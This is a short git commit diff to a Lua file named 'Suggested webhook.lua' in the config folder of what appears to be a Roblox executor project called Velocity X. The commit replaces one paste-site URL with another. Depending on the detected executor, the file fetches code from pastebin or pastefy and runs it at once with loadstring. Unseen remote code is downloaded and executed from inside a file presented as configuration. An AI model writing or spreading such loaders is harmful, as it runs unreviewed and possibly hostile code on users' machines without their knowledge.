6b3ea2a75a7995003d9ba72d34b59fa8ed114a2f
Mainery-foxxie <hilosussy@gmail.com>
2026-04-11 20:03:06 +0700

    Update Suggested webhook.lua

--- Velocity X/config/Suggested webhook.lua
+++ Velocity X/config/Suggested webhook.lua
@@ -2,7 +2,7 @@ task.spawn(function()
     local success, executor = pcall(identifyexecutor)
 
     if success and executor and string.find(executor, "Delta") then       
-loadstring(game:HttpGet("https://pastebin.com/raw/7g5uYG0n"))()
+loadstring(game:HttpGet("https://pastefy.app/7SlhG8yG/raw"))()
         else
      loadstring(game:HttpGet("https://pastefy.app/RViMCyPV/raw"))()
      end
